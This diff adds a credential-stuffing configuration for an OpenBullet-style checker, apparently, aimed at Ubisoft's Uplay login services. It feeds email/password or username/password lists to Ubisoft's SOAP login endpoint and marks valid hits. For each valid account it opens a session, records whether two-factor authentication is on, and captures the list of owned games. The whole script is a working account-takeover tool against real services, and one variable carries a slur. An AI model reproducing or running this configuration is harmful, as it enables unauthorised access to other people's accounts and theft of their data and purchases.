@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "Uplay",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-03T21:15:40.1551726+00:00",
+  "AdditionalInfo": "",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "http://signupservice.ubi.com/PublicSignupService.svc" AutoRedirect=FALSE 
+  CONTENT "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns=\"http://publicservice.ubi.com/publicservice/2011/05\"> <soapenv:Header/> <soapenv:Body>  <ns:LogIn>   <ns:genomeId>c72aa68b-ba70-4f4f-83c9-e0cc7728ac19</ns:genomeId>   <ns:userName><USER></ns:userName>   <ns:password><PASS></ns:password>  </ns:LogIn> </soapenv:Body></soapenv:Envelope>" 
+  CONTENTTYPE "text/xml;charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "SOAPAction: http://publicservice.ubi.com/publicservice/2011/05/IPublicSignupService/LogIn" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "nil=\"true" 
+  KEYCHAIN Success OR 
+    KEY "AccountName" 
+FUNCTION Base64Encode "<USER>:<PASS>" -> VAR "choempie" 
+REQUEST POST "https://api-ubiservices.ubi.com/v2/profiles/sessions" AutoRedirect=FALSE 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "ClientChannel: PlaygroundSDK_ANDROID_" 
+  HEADER "Ubi-AppBuildId: 1.0.7p" 
+  HEADER "Ubi-AppId: 805319f5-950b-4490-9b3f-4e420df5084a" 
+  HEADER "Ubi-RequestedPlatformType: uplay" 
+  HEADER "Authorization: Basic <choempie>" 
+PARSE "<SOURCE>" JSON "ticket" Recursive=FALSE -> VAR "token" "" "" 
+PARSE "<SOURCE>" JSON "sessionId" Recursive=FALSE -> VAR "ses" "" "" 
+PARSE "<SOURCE>" JSON "token" Recursive=FALSE -> VAR "kanker" "" "" 
+PARSE "<SOURCE>" JSON "profileId" Recursive=FALSE -> VAR "id" "" "" 
+REQUEST GET "https://api-ubiservices.ubi.com/v2/profiles/me/2fa" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Ubi_v1 t=<token>" 
+  HEADER "Ubi-AppId: f68a4bb5-608a-4ff2-8123-be8ef797e0a6" 
+  HEADER "Ubi-SessionId: <ses>" 
+PARSE "<SOURCE>" JSON "active" Recursive=FALSE -> CAP "2FA?" "" "" 
+REQUEST GET "https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/<id>/en-GB/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Ubi-AppId: f68a4bb5-608a-4ff2-8123-be8ef797e0a6" 
+  HEADER "Token: <kanker>" 
+PARSE "<SOURCE>" JSON "TotalCount" Recursive=FALSE -> VAR "Total" "" "" 
+PARSE "<SOURCE>" REGEX "\"Name\":\"([^\"]*)\",\"Owned\":true,\"PlatformCode\":\"([^\"]*)" "[1] for [2]" Recursive=TRUE -> CAP "" "" "" 
